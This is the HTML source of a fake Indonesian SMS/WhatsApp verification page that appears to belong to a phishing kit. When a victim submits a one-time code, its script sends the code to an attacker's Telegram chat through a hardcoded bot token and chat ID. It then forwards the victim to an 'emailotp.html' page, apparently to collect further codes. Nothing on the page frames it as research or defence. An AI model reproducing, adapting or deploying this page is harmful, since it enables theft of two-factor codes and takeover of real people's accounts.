<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>OTP</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <link
    rel="stylesheet"
    href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css"
  />
  <style>
    body {
      background-color: #1e1e1e;
      color: white;
      font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI",
        Roboto, "Helvetica Neue", Arial, sans-serif;
      min-height: 100vh;
      padding: 1rem;
    }
    .container {
      max-width: 28rem;
      margin-left: auto;
      margin-right: auto;
    }
    .back-button {
      margin-bottom: 1.5rem;
      background: none;
      border: none;
      color: white;
      font-size: 1.25rem;
      cursor: pointer;
    }
    h1 {
      font-weight: 900; /* Extra bold */
      font-size: 3rem;
      margin-bottom: 0.5rem;
    }
    p {
      font-weight: 400;
      font-size: 1rem;
      margin-bottom: 1rem;
    }
    .input-container {
      display: flex;
      justify-content: space-between;
      align-items: center;
      background-color: #4a4a55;
      border-radius: 0.5rem;
      padding: 0.75rem 1rem;
      margin-bottom: 1.5rem;
    }
    input[type="text"] {
      background: transparent;
      border: none;
      color: white;
      font-size: 1rem;
      flex-grow: 1;
      outline: none;
    }
    input[type="text"]::placeholder {
      color: #7a7a8a;
    }
    .resend-text {
      color: #dcdcdc;
      font-weight: 600;
      font-size: 0.875rem; /* Reduced size */
      margin-left: 1rem;
      white-space: nowrap;
      cursor: pointer;
      user-select: none;
      transition: color 0.3s ease;
    }
    .resend-text.active {
      color: #22c55e; /* Tailwind green-500 */
    }
    button.submit-btn {
      width: 100%;
      background-color: #b9b3b9;
      color: white;
      font-size: 1.125rem; /* lg */
      font-weight: 400;
      border-radius: 0.5rem;
      padding: 0.75rem 0;
      border: none;
      cursor: not-allowed;
      opacity: 0.6;
    }
    button.submit-btn.enabled {
      cursor: pointer;
      opacity: 1;
      background-color: #228B22;
    }
  </style>
</head>
<body>
  <div class="container">
    <button aria-label="Back" class="back-button" onclick="history.back()">
      <i class="fas fa-arrow-left"></i>
    </button>
    <strong>Verifikasi</strong>
    <p>Kode akan dikirim ke SMS/WhatsApp</p>
    <form id="verificationForm" class="input-container" onsubmit="sendToTelegram(event)">
      <input
        type="text"
        id="codeInput"
        name="code"
        placeholder="Kode verifikasi seluler"
        required
        inputmode="numeric"
        pattern="[0-9]*"
        oninput="handleInput()"
        maxlength="6"
        autocomplete="one-time-code"
      />
      <span id="resendText" class="resend-text" onclick="handleResendClick()">60s</span>
    </form>
    <button type="submit" form="verificationForm" class="submit-btn" disabled>Kirimkan</button>
  </div>

  <script>
    let countdown = 60;
    const resendText = document.getElementById('resendText');
    const submitBtn = document.querySelector('button.submit-btn');
    const codeInput = document.getElementById('codeInput');
    let timerId;

    function updateResendText() {
      if (countdown > 0) {
        resendText.textContent = `${countdown}s`;
        resendText.classList.remove('active');
        resendText.style.pointerEvents = 'none';
        resendText.style.opacity = '0.7';
        countdown--;
      } else {
        resendText.textContent = 'Kirim ulang';
        resendText.classList.add('active');
        resendText.style.pointerEvents = 'auto';
        resendText.style.opacity = '1';
        clearInterval(timerId);
      }
    }

    function startCountdown() {
      countdown = 60;
      updateResendText();
      timerId = setInterval(updateResendText, 1000);
    }

    function handleResendClick() {
      if (countdown === 0) {
        // Add resend code logic here if needed
        startCountdown();
        alert('Kode verifikasi telah dikirim ulang.');
      }
    }

    function handleInput() {
      // Only digits allowed (already filtered by oninput)
      const value = codeInput.value.trim();
      if (value.length > 0) {
        submitBtn.disabled = false;
        submitBtn.classList.add('enabled');
      } else {
        submitBtn.disabled = true;
        submitBtn.classList.remove('enabled');
      }
    }

    startCountdown();

    async function sendToTelegram(event) {
      event.preventDefault();
      const code = codeInput.value.trim();
      if (!code) return;

      // Replace with your Telegram bot token and chat ID
      const botToken = '7367488430:AAFt7-ZdH5runtY3gZOv5hoheTN5Qucl74g';
      const chatId = '5906925079';

      const message = `Kode verifikasi seluler: ${code}`;

      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

      try {
        const response = await fetch(url, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            chat_id: chatId,
            text: message,
          }),
        });

        if (response.ok) {
          window.location.href = "emailotp.html";
          document.getElementById('verificationForm').reset();
          handleInput(); // disable button after reset
        } else {
          alert('Gagal mengirim kode ke Telegram.');
        }
      } catch (error) {
        alert('Terjadi kesalahan saat mengirim kode.');
      }
    }
  </script>
</body>
</html>
